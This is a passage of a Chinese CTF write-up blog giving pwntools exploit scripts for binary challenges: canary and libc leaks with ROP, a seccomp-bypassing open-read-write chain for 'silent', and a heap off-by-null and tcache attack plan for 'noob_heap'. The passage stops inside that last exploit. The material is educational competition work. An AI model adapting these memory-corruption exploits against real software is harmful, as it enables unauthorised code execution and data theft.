<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#from LibcSearcher import*</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">prdi=<span class="number">0x2a3e5</span></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;45.153.243.57&#x27;,1337)</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">code=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11c9</span></span><br><span class="line">puts_got=code+<span class="number">0x3fd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(code))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x80</span>-<span class="number">0x29dc0</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)+p64(<span class="number">0x1</span>)+p64(libc_base+prdi)+p64(libc_base+<span class="number">0x1d8698</span>)+p64(code+<span class="number">0x101a</span>)+p64(libc_base+<span class="number">0x050d60</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;133&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;133&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line"><span class="comment">#libc=puts_addr-0x84ed0</span></span><br><span class="line"><span class="comment">#one=libc+0xeeccc</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1337&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1024&#x27;)</span></span><br></pre></td></tr></table></figure>
<h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><p>首先是程序没有给定libc版本,</p>
<p>然后我运行的环境是ubuntu20,gdb提示需要glibc_234</p>
<p>当时直接以为程序原本就是glibc234了,但实际上这是最小需求,真正可能libc版本更高</p>
<p>所以在泄露libc时,就出现了远程<code>__libc_start_main-125</code>并不能找到对应的libc的情况</p>
<p>即e40-7d=dc3无对应libc,当时压根没想到libc_start_main的函数偏移不同</p>
<p>脑子短路了一阵</p>
<p>之后利用更改rbp使得puts泄露got加以确定libc基址才回过神来</p>
<hr>
<p><strong>小知识点:</strong></p>
<p><strong>libc中绝大部分函数地址是十六进制对齐,小部分是八进制对齐,极小部分是其他情况</strong></p>
<p><strong>因此当计算出的地址不是十六进制或八进制对齐基本可以认为是本地偏移与远程偏移有差</strong></p>
<p><strong>可以就近对齐十六进制或八进制尝试</strong></p>
<p>或者泄露其他函数对照</p>
<h1 id="2023鹏城杯-silent"><a href="#2023鹏城杯-silent" class="headerlink" title="2023鹏城杯-silent"></a>2023鹏城杯-silent</h1><p><strong>标签:栈溢出|ret2text?|rop|栈迁移</strong></p>
<p><strong>题目介绍:</strong></p>
<p>程序十分简短</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init_seccomp();</span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启了沙盒</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/pwn$ seccomp-tools dump ./silent</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>禁止execve,只能orw了</p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/silent&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>
<p>如果不是FULL RELRO可以考虑ret2dl</p>
<p>只能另作他解了</p>
<h3 id="解1"><a href="#解1" class="headerlink" title="解1:"></a>解1:</h3><p>解1是比赛时根据找到的一题非常像的题目的思路做的</p>
<p>简单来说就是栈迁移将栈迁移到bss段,然后调用_<em>libc_start_main去启动一段代码,于是\</em>_libc_start_main会在迁移后的栈上留下read+17的代码地址,在read等系统调用级的代码中一般都会有syscall</p>
<p>如下所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_221859.png" alt=""></p>
<p>不过如果用telescope这些查看的方式是找不到syscall的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_222054.png" alt=""></p>
<p>还是得用disassemble或者x去查看查找</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_222115.png" alt=""></p>
<p>可以找到这一段,可以视为syscall;ret</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_221835.png" alt=""></p>
<p>利用rop流将存储在栈中的read+17改为read+15便可以了</p>
<p>原理如上</p>
<p>实际利用过程中,选择采取重启read@plt表,毕竟其也属于代码段,而且刚好能更方便的利用__libc_start_main的参数</p>
<p>然后在libc_start_main启动read的时候把libc_start_main的返回栈修改为rop流接着进行orw</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;172.10.0.8&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p,<span class="string">&#x27;b __libc_start_main&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15</span>):</span><br><span class="line">    pay = p64(<span class="number">0x40095A</span>)</span><br><span class="line">    pay += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    pay += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    pay += p64(r12) <span class="comment">#call_func</span></span><br><span class="line">    pay += p64(r13) <span class="comment">#edi</span></span><br><span class="line">    pay += p64(r14) <span class="comment">#rsi</span></span><br><span class="line">    pay += p64(r15) <span class="comment">#rdx</span></span><br><span class="line">    pay += p64(<span class="number">0x400940</span>)</span><br><span class="line">    pay += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"> </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x601100</span></span><br><span class="line">leave_ret = <span class="number">0x4008FC</span></span><br><span class="line">pop_rbp = <span class="number">0x400788</span></span><br><span class="line">ret=<span class="number">0x4008FD</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + csu(read_got,<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">0x580</span>)</span><br><span class="line">pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x601560</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x400</span>)</span><br><span class="line">payload +=csu(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],read_plt,<span class="number">0</span>,bss+<span class="number">0x478</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=csu(read_got,<span class="number">0</span>,syscall,<span class="number">1</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">0x2</span>)+ csu(syscall,bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=csu(read_got,<span class="number">3</span>,bss+<span class="number">0x420</span>,<span class="number">80</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">1</span>)+csu(syscall,<span class="number">1</span>,bss+<span class="number">0x420</span>,<span class="number">40</span>)<span class="comment">#orw</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x2f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;22&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>不过这种办法只能本地打通,远程似乎因为不是正常退出没有回显,又或者是flag的地址没有设对</p>
<h3 id="解2"><a href="#解2" class="headerlink" title="解2:"></a>解2:</h3><p>赛后其他人的解法</p>
<p>用到了一个之前完全没听说过的magic gadget来使得stdout改写为libc中gadget syscall;ret;</p>
<p>学到了,不过得有__do_global_dtors_aux这个函数才行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:  01 5d c3                add    DWORD PTR [rbp-0x3d],ebx</span><br><span class="line">3:  0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">8:  f3 c3                   repz ret</span><br></pre></td></tr></table></figure>
<p>然后利用libc_csu_init和read的返回数控制前三个参数和rax的值</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    <span class="comment"># p = process(name,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;172.10.0.8&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400963</span></span><br><span class="line">start = <span class="number">0x400720</span></span><br><span class="line">csu_1 = <span class="number">0x00000000040095A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov     rdx, r15</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r13d</span></span><br><span class="line"><span class="string">call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbp, rbx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">csu_2 = <span class="number">0x000000000400940</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">get_p(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line">bss = <span class="number">0x602100</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400876</span></span><br><span class="line">stdout = <span class="number">0x000000000601020</span></span><br><span class="line">op = <span class="number">0xffffffffffffffff</span> &amp; (<span class="number">0x00000000000d2625</span>-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">syscall = p64(csu_1) + p64(op) + p64(stdout+<span class="number">0x3d</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(bss-<span class="number">8</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span> + syscall</span><br><span class="line"></span><br><span class="line">payload += p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(stdout) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(stdout) + p64(<span class="number">1</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x40</span>) + p64(csu_2)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>只能说不愧是大佬,见多识广有经验</p>
<h1 id="2023第六届强网拟态-noob-heap"><a href="#2023第六届强网拟态-noob-heap" class="headerlink" title="2023第六届强网拟态- noob_heap"></a>2023第六届强网拟态- noob_heap</h1><p><strong>标签:off-by-null|malloc_consolidate|rop|栈迁移|unlink|tcache attack</strong></p>
<p><strong>题目介绍:</strong>noob_heap</p>
<p>checksec</p>
<figure class="highlight plaintext"><figcaption><span>'/home/aichch/pwn/nb'</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>保护全开,还有沙盒,禁掉了execve,目标是orw</p>
<p>glibc是2.35,算是高版本了</p>
<p>程序实现就是老四样:增删查改</p>
<p>其中edit存在off by null</p>
<p>让人比较难受的一个点是malloc申请的size只能处于0x20到0x80</p>
<p>这也就是说chunk正常情况下是不会被放到unsorted中的,而2.32往上的版本的fastbin和tcachebin都是加密过的,也就是说无法泄露堆和libc</p>
<p>这里就需要用到一个知识点:</p>
<p><strong>scanf读取数字时发送一个非常长的数字字符串会触发malloc和free</strong>,申请的chunk大小为0x810处于largebin,会触发malloc_consolidate处理fastbin</p>
<p>那么最终流程如下:</p>
<ol>
<li>申请足够的chunk,并释放使其有足够的数量被放入fastbin,这里申请时就要为之后的fake chunk做一些铺垫,提前写上一些东西</li>
<li>利用sacnf触发malloc_consolidate,使fastbin合并并加入smallbin称为C0</li>
<li>申请chunk泄露libc和heap</li>
<li>从合并后的chunk中切出一部分C1,off by null覆盖掉剩余部分的size</li>
<li>free C1前面的chunk,使得C1进行unlink,并最终造成堆块堆叠</li>
<li>再将堆叠后的chunk的C1部分取出作为C2,现在可以uaf进行tcache攻击了</li>
<li>tache attack取出environ符号,获得栈地址</li>
<li>再tcache attack取出返回栈,进行rop构造,因为可写栈有限,所以可以栈迁移到堆上,之后无论是再次栈迁移,还是利用setcontext都可行</li>
</ol>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span 